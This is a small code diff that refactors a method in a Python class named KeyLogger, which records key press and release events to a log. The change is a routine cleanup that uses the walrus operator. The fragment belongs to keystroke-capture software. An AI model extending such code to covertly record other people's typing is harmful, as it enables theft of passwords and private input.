@@ -185,10 +185,7 @@ class KeyLogger:
         if CONFIGURATIONS.event_release:
             self.save(f"RELEASE: {self.get_event_char(event)}\n")
 
-        # code = self.get_code(event)
-
-        is_pressed = self.is_pressed
-        if is_pressed:
+        if is_pressed := self.is_pressed:
             is_pressed.pop()
 
         return self.run
